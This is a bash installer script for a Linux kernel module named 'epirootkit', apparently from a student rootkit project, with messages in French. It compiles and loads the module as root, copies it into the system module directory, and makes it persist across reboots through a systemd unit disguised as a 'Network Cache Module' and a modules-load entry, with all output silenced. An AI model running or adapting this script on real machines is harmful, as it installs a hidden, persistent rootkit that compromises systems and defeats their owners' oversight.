#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "tapez sudo pour installer" >&2
    exit 1
fi

PROJECT_DIR=$(pwd)
MODULE_NAME="epirootkit"

echo "Compilation..."
make clean >/dev/null 2>&1 && make >/dev/null 2>&1

if [ ! -f "${MODULE_NAME}.ko" ]; then
    echo "mauvaise compile" >&2
    exit 1
fi

echo "Installation du module..."
if lsmod | grep -q "$MODULE_NAME"; then
    rmmod "$MODULE_NAME" >/dev/null 2>&1
fi

insmod "${MODULE_NAME}.ko" >/dev/null 2>&1

MODULE_DEST="/lib/modules/$(uname -r)/extra"
mkdir -p "$MODULE_DEST" >/dev/null 2>&1
cp "${MODULE_NAME}.ko" "$MODULE_DEST/" >/dev/null 2>&1
depmod -a >/dev/null 2>&1

echo "Configuration de la persistance..."
cat > /etc/systemd/system/network-cache.service << EOF
[Unit]
Description=Network Cache Module
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe $MODULE_NAME
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload >/dev/null 2>&1
systemctl enable network-cache.service >/dev/null 2>&1
systemctl start network-cache.service >/dev/null 2>&1

echo "$MODULE_NAME" > /etc/modules-load.d/network-cache.conf

echo "Installation terminee"
make clean >/dev/null 2>&1

